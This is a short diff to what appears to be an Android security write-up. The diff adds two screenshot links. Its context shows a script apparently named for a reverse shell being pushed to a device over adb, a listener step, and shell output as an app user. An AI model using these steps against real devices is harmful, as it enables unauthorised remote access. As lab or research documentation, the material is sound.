@@ -106,6 +106,8 @@ EOF
 adb push /tmp/rs.sh /data/local/tmp/rs.sh
 adb shell chmod 755 /data/local/tmp/rs.sh
 ```
+<img width="1271" height="287" alt="image" src="https://github.com/user-attachments/assets/5f633472-f412-44be-987f-e32c189cfa85" />
+
 
 Start the listener:
 
@@ -130,6 +132,9 @@ u0_a211
 :/ $ id
 uid=10211(u0_a211) gid=10211(u0_a211) groups=10211(u0_a211),3003(inet),...
 ```
+
+<img width="932" height="207" alt="image" src="https://github.com/user-attachments/assets/403f6d6e-da2d-42ac-a0c2-024fea603d4a" />
+
 
 ---
 
